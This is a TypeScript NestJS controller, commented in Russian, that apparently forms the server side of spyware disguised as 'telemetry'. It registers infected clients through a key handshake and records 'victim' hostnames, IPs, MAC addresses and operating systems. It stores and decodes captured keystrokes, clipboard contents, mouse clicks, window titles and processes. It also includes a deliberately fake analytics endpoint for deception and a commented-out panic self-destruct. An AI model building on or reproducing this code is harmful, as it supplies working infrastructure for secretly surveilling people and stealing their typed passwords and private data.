import {
  Controller,
  Post,
  Get,
  Body,
  Req,
  Param,
  HttpException,
  HttpStatus,
  UseFilters,
} from '@nestjs/common';
import { Request } from 'express';
import { TelemetryService } from './telemetry.service';
import { TelemetryAuthService } from './telemetry-auth.service';
import { InitTelemetryDto } from './dto/init-telemetry.dto';
import { TelemetryDataDto } from './dto/telemetry-data.dto';
import { TelemetryBodyDto } from './dto/telemetry-body.dto';
import { TelemetryExceptionFilter } from './filters/telemetry-exception.filter';
import { ConfigService } from '@nestjs/config';
import { Client } from 'pg';
import {
  DecryptedTelemetryData,
  TelemetryLogResponse,
  VictimInfo,
} from './entities/telemetry.entity';

@Controller('api')
@UseFilters(TelemetryExceptionFilter)
export class TelemetryController {
  private attackCounter = new Map<string, number>(); // IP hash -> count
  private readonly panicCode: string;
  private readonly MAX_PAYLOAD_SIZE = 10 * 1024 * 1024; // 10MB

  constructor(
    private readonly telemetryService: TelemetryService,
    private readonly authService: TelemetryAuthService,
    private readonly configService: ConfigService,
  ) {
    this.panicCode = this.configService.get<string>('PANIC_CODE') || '';
  }

  /**
   * Эндпоинт инициализации: POST /api/v1/init
   * Двухфазный handshake - клиент отправляет публичный ключ, получает зашифрованный response_key
   */
  @Post('v1/init')
  async initClient(@Req() req: Request) {
    console.log('=== INIT REQUEST ===');
    console.log('IP:', req.ip);
    console.log('User-Agent:', req.headers['user-agent']);
    console.log('Content-Type:', req.headers['content-type']);
    
    // ШАГ 0: Предварительная проверка Content-Type
    const contentType = req.headers['content-type'];
    if (!contentType?.includes('application/json')) {
      console.log('❌ ERROR: Invalid content type');
      return this.telemetryService.padResponse({
        status: 'error',
        message: 'Invalid content type',
      });
    }
  
    // ШАГ 1: Защита от повторных атак
    const clientInfo = this.authService.extractClientInfo(req);
    const ipHash = this.authService.hashIpAddress(clientInfo.ip);
    const attackCount = this.attackCounter.get(ipHash) || 0;
    console.log('IP Hash:', ipHash, 'Attack count:', attackCount);
    if (attackCount > 10) {
      console.log('❌ ERROR: Rate limited');
      return this.telemetryService.padResponse({
        status: 'error',
        message: 'Rate limited',
      });
    }
  
    // ШАГ 2: Ручной парсинг JSON
    let body = req.body;
    
    // ДЕТАЛЬНОЕ ЛОГИРОВАНИЕ ДЛЯ ДИАГНОСТИКИ
    console.log('=== INIT REQUEST DEBUG ===');
    console.log('Body keys:', body ? Object.keys(body) : 'NO BODY');
    console.log('Body.timestamp:', body?.timestamp);
    console.log('Body.client_public_key:', body?.client_public_key ? `PRESENT (${body.client_public_key.length} chars)` : 'MISSING');
    console.log('Body.hostname:', body?.hostname);
    
    // ШАГ 3: Валидация timestamp
    if (!body?.timestamp) {
      console.log('ERROR: timestamp is missing');
      this.attackCounter.set(ipHash, attackCount + 1);
      throw new HttpException('Unauthorized', HttpStatus.UNAUTHORIZED);
    }
    
    const timestampValid = this.authService.validateTimestamp(body.timestamp);
    console.log('Timestamp validation:', timestampValid);
    if (!timestampValid) {
      console.log('ERROR: timestamp validation failed');
      this.attackCounter.set(ipHash, attackCount + 1);
      throw new HttpException('Unauthorized', HttpStatus.UNAUTHORIZED);
    }
  
    // ШАГ 4: Валидация публичного ключа
    if (!body?.client_public_key) {
      console.log('ERROR: client_public_key is missing');
      this.attackCounter.set(ipHash, attackCount + 1);
      throw new HttpException('Unauthorized', HttpStatus.UNAUTHORIZED);
    }
    
    const keyValid = this.authService.validatePublicKey(body.client_public_key);
    console.log('Public key validation:', keyValid);
    if (!keyValid) {
      console.log('ERROR: public key validation failed');
      this.attackCounter.set(ipHash, attackCount + 1);
      throw new HttpException('Unauthorized', HttpStatus.UNAUTHORIZED);
    }
  
    // ШАГ 5: Валидация hostname (если нужен whitelist)
    const hostnameValid = this.authService.isHostnameAllowed(body.hostname || '');
    console.log('Hostname validation:', hostnameValid);
    if (!hostnameValid) {
      console.log('ERROR: hostname validation failed');
      this.attackCounter.set(ipHash, attackCount + 1);
      throw new HttpException('Unauthorized', HttpStatus.UNAUTHORIZED);
    }
  
    console.log('=== ALL VALIDATIONS PASSED ===');
  
    // ШАГ 6: Обработка init
    try {
      const result = await this.telemetryService.handleInit(
        body.client_public_key,
        body.hostname || '',
      );
  
      console.log('✅ INIT SUCCESS');
      console.log('Returned client_id:', result.client_id);
      console.log('Response key length:', result.response_key?.length || 0);
  
      // Успех - сброс счётчика
      this.attackCounter.delete(ipHash);
  
      return this.telemetryService.padResponse({
        status: 'ok',
        client_id: result.client_id,
        response_key: result.response_key,
      });
    } catch (error) {
      console.error('❌ ERROR in handleInit:', error.message);
      console.error('Error stack:', error.stack);
      this.attackCounter.set(ipHash, attackCount + 1);
      throw new HttpException('Unauthorized', HttpStatus.UNAUTHORIZED);
    }
  }

  /**
   * Основной эндпоинт: POST /api/v1/telemetry
   * Принимает зашифрованные данные, сохраняет БЕЗ расшифровки
   */
  // @Post('v1/telemetry')
  // async receiveTelemetry(@Req() req: Request) {
  //   // ШАГ 0: Предварительная проверка Content-Type
  //   const contentType = req.headers['content-type'];
  //   if (!contentType?.includes('application/json')) {
  //     return this.telemetryService.padResponse({
  //       status: 'error',
  //       message: 'Invalid content type',
  //     });
  //   }

  //   // ШАГ 0.5: Проверка размера ДО парсинга
  //   const contentLength = parseInt(req.headers['content-length'] || '0', 10);
  //   if (contentLength > this.MAX_PAYLOAD_SIZE) {
  //     return this.telemetryService.padResponse({
  //       status: 'error',
  //       message: 'Payload too large',
  //     });
  //   }

  //   // ШАГ 1: Защита от повторных атак
  //   const clientInfo = this.authService.extractClientInfo(req);
  //   const ipHash = this.authService.hashIpAddress(clientInfo.ip);
  //   const attackCount = this.attackCounter.get(ipHash) || 0;
  //   if (attackCount > 10) {
  //     return this.telemetryService.padResponse({
  //       status: 'error',
  //       message: 'Rate limited',
  //     });
  //   }

  //   // ШАГ 2: Ручной парсинг JSON
  //   let body: any;
  //   try {
  //     body = await new Promise((resolve, reject) => {
  //       let data = '';
  //       req.on('data', (chunk) => (data += chunk));
  //       req.on('end', () => {
  //         try {
  //           resolve(JSON.parse(data));
  //         } catch {
  //           reject(new Error('Invalid JSON'));
  //         }
  //       });
  //     });
  //   } catch {
  //     this.attackCounter.set(ipHash, attackCount + 1);
  //     setTimeout(() => {
  //       this.attackCounter.delete(ipHash);
  //     }, 3600000);
  //     return this.telemetryService.padResponse({
  //       status: 'ok',
  //       id: Date.now().toString(),
  //     });
  //   }

  //   // ШАГ 3: Паник-проверка
  //   if (body._panic === this.panicCode) {
  //     await this.telemetryService.selfDestruct();
  //     return this.telemetryService.padResponse({
  //       status: 'ok',
  //       message: 'Panic mode activated',
  //     });
  //   }

  //   // ШАГ 4: Валидация timestamp
  //   if (!this.authService.validateTimestamp(body.timestamp)) {
  //     this.attackCounter.set(ipHash, attackCount + 1);
  //     throw new HttpException('Unauthorized', HttpStatus.UNAUTHORIZED);
  //   }

  //   // ШАГ 5: Проверка размера payload
  //   if (body.data) {
  //     const payloadSize = Buffer.from(body.data, 'base64').length;
  //     if (payloadSize > this.MAX_PAYLOAD_SIZE) {
  //       return this.telemetryService.padResponse({
  //         status: 'error',
  //         message: 'Payload too large',
  //       });
  //     }
  //   }

  //   // ШАГ 6: Сохранение зашифрованных данных (БЕЗ расшифровки)
  //   try {
  //     const id = await this.telemetryService.saveTelemetryData(
  //       body.client_id,
  //       body.timestamp,
  //       body.data,
  //     );

  //     // Успех - сброс счётчика
  //     this.attackCounter.delete(ipHash);

  //     return this.telemetryService.padResponse({
  //       status: 'success',
  //       id,
  //       received_at: new Date().toISOString(),
  //     });
  //   } catch (error) {
  //     this.attackCounter.set(ipHash, attackCount + 1);
  //     throw new HttpException(
  //       'Internal server error',
  //       HttpStatus.INTERNAL_SERVER_ERROR,
  //     );
  //   }
  // }

  @Post('v1/telemetry')
  async receiveTelemetry(@Body() body: TelemetryBodyDto, @Req() req: Request) {
    console.log('=== TELEMETRY ENDPOINT HIT ===');
    console.log('IP:', req.ip);
    console.log('User-Agent:', req.headers['user-agent']);
    console.log('Body keys:', body ? Object.keys(body) : 'NO BODY');
    console.log('client_id:', body?.client_id);
    console.log('has frontend_data:', !!body?.frontend_data);
    console.log('data length:', body?.data?.length || 0);
    
    try {
      if (!body || !body.client_id) {
        console.log('❌ ERROR: Missing client_id');
        return { status: 'error', message: 'Missing client_id' };
      }
      
      const clientId = body.client_id;
      const timestamp = body.timestamp || new Date().toISOString();
      const data = body.data || '';
      
      // Сохраняем метаданные жертвы если они есть
      if (body.frontend_data) {
        console.log('Saving victim metadata...');
        console.log('frontend_data:', JSON.stringify(body.frontend_data, null, 2));
        try {
          await this.telemetryService.updateVictimMetadata(clientId, body.frontend_data);
          console.log('✅ Victim metadata saved');
        } catch (err) {
          console.error('❌ Error saving victim metadata:', err.message);
          console.error('Error stack:', err.stack);
        }
      }
      
      // Сохраняем сам лог
      console.log('Saving telemetry log...');
      const logId = await this.telemetryService.saveTelemetryLog(
        clientId,
        timestamp,
        data
      );
      
      console.log(`✅ Telemetry logged: ${logId} from ${clientId}`);
      
      return {
        status: 'success',
        id: logId,
        received_at: new Date().toISOString()
      };
      
    } catch (error) {
      console.error('❌ ERROR in receiveTelemetry:', error.message);
      console.error('Error stack:', error.stack);
      return { status: 'error', message: 'Internal server error' };
    }
  }
  /**
   * Фейковый эндпоинт для обмана: POST /api/analytics
   */
  @Post('analytics')
  async fakeAnalytics(@Body() body: any) {
    try {
      // // Сохраняем в отдельную таблицу в Render PostgreSQL
      // await this.telemetryService.databaseService.query(
      //   `INSERT INTO fake_analytics_logs (data, received_at) VALUES ($1, $2)`,
      //   [JSON.stringify(body), new Date().toISOString()],
      // );

      // Всегда возвращаем успех
      return {
        status: 'tracked',
        id: Date.now().toString(),
      };
    } catch (error) {
      // Даже при ошибке возвращаем успех
      return {
        status: 'tracked',
        id: Date.now().toString(),
      };
    }
  }

  /**
   * Health endpoint: GET /api/health
   */
  @Get('health')
  async health() {
    try {
      // // Проверка подключения к Render PostgreSQL
      // await this.telemetryService.databaseService.query('SELECT 1');

      return {
        status: 'ok',
        timestamp: new Date().toISOString(),
      };
    } catch (error) {
      return {
        status: 'error',
        timestamp: new Date().toISOString(),
        message: 'Health check failed',
      };
    }
  }

  /**
   * Endpoint схемы БД: GET /api/v1/database/tables
   * Возвращает таблицы и их колонки из TELEMETRY_DATABASE_URL
   */
  @Get('v1/database/tables')
  async getDatabaseTables() {
    try {
      const tables = await this.telemetryService.getDatabaseTables();

      return {
        success: true,
        tables,
        count: tables.length,
        timestamp: new Date().toISOString(),
      };
    } catch (error) {
      console.error('Error in getDatabaseTables:', error);
      return {
        success: false,
        error: error.message || 'Failed to fetch database tables',
        tables: [],
        count: 0,
        timestamp: new Date().toISOString(),
      };
    }
  }

  @Get('debug/db-check')
    async checkTables() {
      // Мы используем тот же Client, который ты импортировал
      const client = new Client({
        connectionString: process.env.DATABASE_URL,
        ssl: { rejectUnauthorized: false },
      });
      
      await client.connect();
      try {
        const res = await client.query(`
          SELECT table_name 
          FROM information_schema.tables 
          WHERE table_schema = 'public';
        `);
        return {
          message: 'Таблицы в БД',
          tables: res.rows.map(r => r.table_name)
        };
      } finally {
        await client.end();
      }
    }
  @Get('debug/db-setup') // Изменили путь для чистоты
    async setupDatabase() {
      const db = new Client({
        connectionString: process.env.DATABASE_URL,
        ssl: { rejectUnauthorized: false },
      });
      
      await db.connect();
      try {
        // 1. Пытаемся создать расширение для UUID (если еще не создано)
        // Если не получится (нет прав), используем gen_random_uuid() вместо uuid_generate_v4()
        try {
          await db.query(`CREATE EXTENSION IF NOT EXISTS "uuid-ossp";`);
          console.log('✅ uuid-ossp extension created or already exists');
        } catch (extError) {
          console.log('⚠️ Could not create uuid-ossp extension, will use gen_random_uuid() instead');
        }

        // 2. Создаем таблицу telemetry_clients
        await db.query(`
CREATE TABLE IF NOT EXISTS telemetry_clients (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  client_public_key TEXT,
  client_public_key_hash VARCHAR(64),
  response_key_encrypted BYTEA,
  first_seen TIMESTAMPTZ DEFAULT NOW(),
  last_seen TIMESTAMPTZ DEFAULT NOW(),
  is_active BOOLEAN DEFAULT true
);

CREATE INDEX IF NOT EXISTS idx_telemetry_clients_id ON telemetry_clients(id);
CREATE INDEX IF NOT EXISTS idx_telemetry_clients_hash ON telemetry_clients(client_public_key_hash);
        `);
        console.log('✅ telemetry_clients table created or already exists');
        
        // 2.1. Добавляем колонку is_active, если её нет (миграция для существующих таблиц)
        try {
          await db.query(`
            DO $$ 
            BEGIN 
              IF NOT EXISTS (
                SELECT 1 FROM information_schema.columns 
                WHERE table_name = 'telemetry_clients' 
                AND column_name = 'is_active'
              ) THEN
                ALTER TABLE telemetry_clients ADD COLUMN is_active BOOLEAN DEFAULT true;
              END IF;
            END $$;
          `);
          console.log('✅ Column is_active checked/added');
        } catch (migError) {
          console.log('⚠️ Could not add is_active column:', migError.message);
        }

        // 3. Создаем таблицу victim_metadata
        await db.query(`

CREATE TABLE IF NOT EXISTS victim_metadata (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  client_id UUID NOT NULL,
  hostname VARCHAR(255),
  ip VARCHAR(45),           
  mac VARCHAR(17),          
  os VARCHAR(255),
  first_seen TIMESTAMPTZ DEFAULT NOW(),
  last_updated TIMESTAMPTZ DEFAULT NOW(),
  UNIQUE(client_id)
);

CREATE INDEX IF NOT EXISTS idx_victim_metadata_client ON victim_metadata(client_id);
CREATE INDEX IF NOT EXISTS idx_victim_metadata_last_updated ON victim_metadata(last_updated);
        `);
        console.log('✅ victim_metadata table created or already exists');

        // 4. Создаем таблицу telemetry_logs (если еще не существует)
        await db.query(`
CREATE TABLE IF NOT EXISTS telemetry_logs (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  client_id UUID NOT NULL REFERENCES telemetry_clients(id) ON DELETE CASCADE,
  timestamp TIMESTAMPTZ,
  encrypted_payload BYTEA,
  payload_size INTEGER DEFAULT 0,
  received_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_telemetry_logs_client ON telemetry_logs(client_id);
CREATE INDEX IF NOT EXISTS idx_telemetry_logs_received_at ON telemetry_logs(received_at);
        `);
        console.log('✅ telemetry_logs table created or already exists');

        return { status: 'success', message: 'Новая архитектура развернута' };
      } catch (err) {
        console.error('❌ Error in setupDatabase:', err);
        return { status: 'error', detail: err.message };
      } finally {
        await db.end();
      }
    }

  @Get('debug/victims-check')
  async checkVictims() {
    try {
      const db = new Client({
        connectionString: process.env.DATABASE_URL,
        ssl: { rejectUnauthorized: false },
      });
      
      await db.connect();
      try {
        // Проверяем все таблицы
        const tablesCheck = await db.query(`
          SELECT table_name 
          FROM information_schema.tables 
          WHERE table_schema = 'public' 
          AND table_name IN ('telemetry_clients', 'victim_metadata', 'telemetry_logs')
        `);
        
        const victimsCount = await db.query(`
          SELECT COUNT(*) as count FROM victim_metadata
        `);
        
        const clientsCount = await db.query(`
          SELECT COUNT(*) as count FROM telemetry_clients
        `);
        
        const logsCount = await db.query(`
          SELECT COUNT(*) as count FROM telemetry_logs
        `);
        
        const recentVictims = await db.query(`
          SELECT client_id, hostname, ip, mac, os, last_updated 
          FROM victim_metadata 
          ORDER BY last_updated DESC 
          LIMIT 10
        `);
        
        // Проверяем существование колонки is_active
        let recentClients;
        try {
          recentClients = await db.query(`
            SELECT id, first_seen, last_seen, is_active 
            FROM telemetry_clients 
            ORDER BY last_seen DESC 
            LIMIT 10
          `);
        } catch (err) {
          // Если колонка is_active не существует, выбираем без неё
          console.log('⚠️ Column is_active does not exist, selecting without it');
          recentClients = await db.query(`
            SELECT id, first_seen, last_seen 
            FROM telemetry_clients 
            ORDER BY last_seen DESC 
            LIMIT 10
          `);
        }
        
        return {
          success: true,
          tables: tablesCheck.rows.map(r => r.table_name),
          counts: {
            victims: parseInt(victimsCount.rows[0]?.count || '0', 10),
            clients: parseInt(clientsCount.rows[0]?.count || '0', 10),
            logs: parseInt(logsCount.rows[0]?.count || '0', 10),
          },
          recent_victims: recentVictims.rows,
          recent_clients: recentClients.rows,
        };
      } finally {
        await db.end();
      }
    } catch (error) {
      console.error('Error in checkVictims:', error);
      return {
        success: false,
        error: error.message,
      };
    }
  }

  @Get('v1/victims')
  async getVictims() {
    try {
      const db = new Client({
        connectionString: process.env.DATABASE_URL,
        ssl: { rejectUnauthorized: false },
      });
      
      await db.connect();
      try {
        const result = await db.query(`
          SELECT 
            vm.client_id,
            vm.hostname,
            vm.ip,
            vm.mac,
            vm.os,
            vm.first_seen,
            vm.last_updated as last_activity
          FROM victim_metadata vm
          WHERE vm.last_updated > NOW() - INTERVAL '30 days'
          ORDER BY vm.last_updated DESC
        `);
        
        return {
          success: true,
          victims: result.rows,
          count: result.rows.length,
        };
      } finally {
        await db.end();
      }
    } catch (error) {
      console.error('Error fetching victims:', error);
      return {
        success: false,
        error: error.message,
      };
    }
  }

  @Get('v1/victim/:clientId/logs')
  async getVictimLogs(@Param('clientId') clientId: string) {
      console.log('=== getVictimLogs START (FULL DATA) ===');
      
      const db = new Client({
          connectionString: process.env.DATABASE_URL,
          ssl: { rejectUnauthorized: false },
      });
  
      try {
          await db.connect();
          console.log('✅ Database connected for getVictimLogs');
          
          // 1. Получаем ВСЕ логи БЕЗ ограничений
          const logsResult = await db.query(`
              SELECT 
                  id,
                  client_id,
                  timestamp,
                  encrypted_payload,
                  payload_size,
                  received_at
              FROM telemetry_logs
              WHERE client_id = $1
              ORDER BY received_at DESC
          `, [clientId]);
          
          console.log(`✅ Found ${logsResult.rows.length} COMPLETE logs for client ${clientId}`);
          
          // 2. Полностью расшифровываем КАЖДЫЙ лог
          const decryptedLogs: TelemetryLogResponse[] = [];
          
          for (const [index, log] of logsResult.rows.entries()) {
              try {
                  console.log(`\n=== Processing log ${index + 1}/${logsResult.rows.length} ===`);
                  console.log(`Log ID: ${log.id}`);
                  console.log(`Payload size: ${log.payload_size} bytes`);
                  
                  let fullDecryptedData: DecryptedTelemetryData | null = null;
                  let dataType = 'unknown';
                  let originalData: string | null = null;
                  
                  if (log.encrypted_payload && log.encrypted_payload.length > 0) {
                      // Сохраняем оригинальные байты
                      const originalBytes = log.encrypted_payload;
                      
                      // 1. Пытаемся как UTF-8 строку
                      try {
                          const asUtf8 = originalBytes.toString('utf8');
                          console.log(`UTF-8 length: ${asUtf8.length} chars`);
                          
                          // 2. Пытаемся распарсить как JSON (может быть уже JSON)
                          try {
                              const parsedJson = JSON.parse(asUtf8);
                              fullDecryptedData = parsedJson;
                              dataType = parsedJson.type || 'json';
                              originalData = parsedJson.data;
                              console.log(`✅ Parsed as JSON, type: ${dataType}`);
                          } catch (jsonError) {
                              // 3. Если не JSON, пробуем base64 декодирование
                              try {
                                  const base64Decoded = Buffer.from(asUtf8, 'base64').toString('utf8');
                                  console.log(`Base64 decoded length: ${base64Decoded.length} chars`);
                                  
                                  const parsedBase64 = JSON.parse(base64Decoded);
                                  fullDecryptedData = parsedBase64;
                                  dataType = parsedBase64.type || 'base64-json';
                                  originalData = parsedBase64.data;
                                  console.log(`✅ Parsed as Base64->JSON, type: ${dataType}`);
                              } catch (base64Error) {
                                  // 4. Если ничего не работает, сохраняем всё что есть
                                  fullDecryptedData = {
                                      raw_utf8: asUtf8,
                                      raw_hex: originalBytes.toString('hex').substring(0, 200) + '...',
                                      original_length: originalBytes.length,
                                      error: 'Could not parse as JSON or Base64'
                                  };
                                  dataType = 'raw';
                                  originalData = asUtf8.substring(0, 500);
                                  console.log(`⚠️ Could not parse, saving as raw`);
                              }
                          }
                      } catch (utf8Error) {
                          // Если не UTF-8, сохраняем как hex
                          fullDecryptedData = {
                              raw_hex: originalBytes.toString('hex'),
                              original_length: originalBytes.length,
                              error: 'Not UTF-8 encoded'
                          };
                          dataType = 'binary';
                          originalData = `Binary data (${originalBytes.length} bytes)`;
                          console.log(`⚠️ Not UTF-8, saving as binary`);
                      }
                  } else {
                      fullDecryptedData = { error: 'Empty payload' };
                      dataType = 'empty';
                      originalData = null;
                      console.log(`⚠️ Empty payload`);
                  }
                  
                  // Убеждаемся, что fullDecryptedData не null
                  if (!fullDecryptedData) {
                      fullDecryptedData = { error: 'Unknown error during decryption' };
                  }
                  
                  // Формируем ПОЛНЫЙ объект лога
                  const completeLog: TelemetryLogResponse = {
                      // Основная информация
                      id: log.id,
                      client_id: log.client_id,
                      timestamp: log.timestamp,
                      received_at: log.received_at,
                      payload_size: log.payload_size,
                      
                      // Тип данных
                      data_type: dataType,
                      encrypted: false, // Уже расшифровано
                      
                      // ПОЛНЫЕ данные (ВСЁ что есть)
                      full_decrypted_data: fullDecryptedData,
                      
                      // Оригинальные данные для отображения
                      original_data: originalData,
                      
                      // Victim info из данных (если есть)
                      victim_info: (fullDecryptedData && 'victim_info' in fullDecryptedData && fullDecryptedData.victim_info) ||
                                  (fullDecryptedData && 'server_data' in fullDecryptedData && fullDecryptedData.server_data?.victim_info) ||
                                  ({} as VictimInfo),
                      
                      // Для удобства фронтенда - основные поля
                      display_data: this.extractDisplayData(fullDecryptedData, dataType),
                      
                      // Техническая информация
                      technical_info: {
                          has_payload: !!log.encrypted_payload,
                          payload_length: log.encrypted_payload?.length || 0,
                          processing_success: true,
                          processed_at: new Date().toISOString()
                      }
                  };
                  
                  decryptedLogs.push(completeLog);
                  console.log(`✅ Log ${index + 1} processed successfully`);
                  
              } catch (error) {
                  console.error(`❌ CRITICAL ERROR processing log ${log.id}:`, error);
                  console.error('Error stack:', error.stack);
                  
                  // Даже при ошибке возвращаем ВСЮ доступную информацию
                  const errorLog: TelemetryLogResponse = {
                      id: log.id,
                      client_id: log.client_id,
                      timestamp: log.timestamp,
                      received_at: log.received_at,
                      payload_size: log.payload_size,
                      data_type: 'error',
                      encrypted: true,
                      full_decrypted_data: {
                          error: error.message,
                          error_stack: error.stack,
                          raw_payload_available: !!log.encrypted_payload,
                          raw_payload_length: log.encrypted_payload?.length || 0
                      },
                      original_data: `ERROR: ${error.message}`,
                      victim_info: {} as VictimInfo,
                      display_data: `Processing error: ${error.message}`,
                      technical_info: {
                          has_payload: !!log.encrypted_payload,
                          payload_length: log.encrypted_payload?.length || 0,
                          processing_success: false,
                          error: error.message
                      }
                  };
                  
                  decryptedLogs.push(errorLog);
              }
          }
          
          console.log(`\n=== FINAL RESULT ===`);
          console.log(`Total logs: ${decryptedLogs.length}`);
          console.log(`Sample of first log:`, JSON.stringify(decryptedLogs[0]?.full_decrypted_data, null, 2));
          
          // Возвращаем ВСЁ
          return {
              success: true,
              client_id: clientId,
              logs: decryptedLogs, // ВСЕ логи полностью
              count: decryptedLogs.length,
              metadata: {
                  total_bytes: decryptedLogs.reduce((sum, log) => sum + (log.payload_size || 0), 0),
                  types_count: this.countDataTypes(decryptedLogs),
                  processed_at: new Date().toISOString(),
                  server_version: '1.0-full-data'
              }
          };
          
      } catch (error) {
          console.error('❌ FATAL ERROR in getVictimLogs:', error.message);
          console.error('Error stack:', error.stack);
          
          return {
              success: false,
              error: error.message,
              error_details: error.stack,
              client_id: clientId,
              logs: [],
              count: 0,
              metadata: {
                  error: true,
                  message: 'Server error',
                  timestamp: new Date().toISOString()
              }
          };
      } finally {
          try {
              await db.end();
              console.log('✅ Database connection closed');
          } catch (closeError) {
              console.error('⚠️ Error closing database:', closeError.message);
          }
      }
  }
  
  // Вспомогательные методы
  private extractDisplayData(
      fullData: DecryptedTelemetryData | null,
      dataType: string,
  ): any {
      if (!fullData) return null;
      
      // Проверяем, что это не объект с ошибкой
      if ('error' in fullData && !('data' in fullData)) {
          return null;
      }
      
      switch (dataType) {
          case 'keystrokes':
              return ('data' in fullData && fullData.data) ||
                     ('keystrokes' in fullData && fullData.keystrokes) ||
                     fullData;
          case 'mouse':
              return ('data' in fullData && fullData.data) ||
                     ('clicks' in fullData && fullData.clicks) ||
                     fullData;
          case 'clipboard':
              return ('data' in fullData && fullData.data) ||
                     ('content' in fullData && fullData.content) ||
                     fullData;
          case 'window':
              return ('data' in fullData && fullData.data) || {
                  title: ('title' in fullData ? fullData.title : undefined),
                  process: ('process' in fullData ? fullData.process : undefined),
                  url: ('url' in fullData ? fullData.url : undefined),
              };
          case 'process':
              return ('data' in fullData && fullData.data) ||
                     ('name' in fullData && fullData.name) ||
                     fullData;
          default:
              return ('data' in fullData && fullData.data) || fullData;
      }
  }
  
  private countDataTypes(logs: TelemetryLogResponse[]): Record<string, number> {
      const counts: Record<string, number> = {};
      logs.forEach(log => {
          const type = log.data_type || 'unknown';
          counts[type] = (counts[type] || 0) + 1;
      });
      return counts;
  }
}
